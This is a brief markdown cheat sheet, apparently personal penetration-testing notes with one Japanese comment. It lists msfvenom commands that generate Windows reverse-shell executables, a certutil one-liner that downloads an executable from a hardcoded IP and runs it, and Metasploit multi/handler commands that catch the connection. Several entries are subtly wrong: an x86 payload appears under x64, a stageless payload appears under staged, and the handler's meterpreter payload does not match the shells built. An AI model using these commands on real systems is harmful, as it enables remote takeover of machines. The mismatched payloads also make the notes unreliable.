# Metasploit
## msfvenom
### staged payloads for windows
#### x86
```
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
```
#### x64
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
```

### stageless payloads for windows
#### x86
```
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
```
#### x64
```
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
```

## Batch file
```
certutil.exe -f -urlcache -split http://192.168.45.232:8000/shell-x64.exe c:\windows\temp\reverse.exe && cmd.exe c:\windows\temp\reverse.exe
```

## msfconsole
use multi/handler  
```
use exploit/multi/handler
```
  
set payload  
msfvenomで選んだpayloadをセットする  
```
set payload windows/x64/meterpreter/reverse_tcp
set lhost ATTACKERIP
set lport ATTACKERPORT
exploit
```

